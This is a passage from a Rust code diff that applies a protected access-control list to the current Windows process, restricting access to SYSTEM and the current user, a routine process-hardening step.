+        let mut sd: PSECURITY_DESCRIPTOR = std::ptr::null_mut();
+        let sddl = wide(&format!("D:P(A;;GA;;;SY)(A;;GA;;;{user})"));
+        if ConvertStringSecurityDescriptorToSecurityDescriptorW(sddl.as_ptr(), SDDL_REVISION_1, &mut sd, std::ptr::null_mut()) == 0 {
+            return;
+        }
+        let (mut present, mut defaulted, mut dacl) = (0, 0, std::ptr::null_mut());
+        GetSecurityDescriptorDacl(sd, &mut present, &mut dacl, &mut defaulted);
+        SetSecurityInfo(
+            GetCurrentProcess(),
+            SE_KERNEL_OBJECT,
+            DACL_SECURITY_INFORMATION | PROTECTED_DACL_SECURITY_INFORMATION,
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            dacl,
+            std::ptr::null(),
+        );
+        LocalFree(sd as _);
+    }
 }
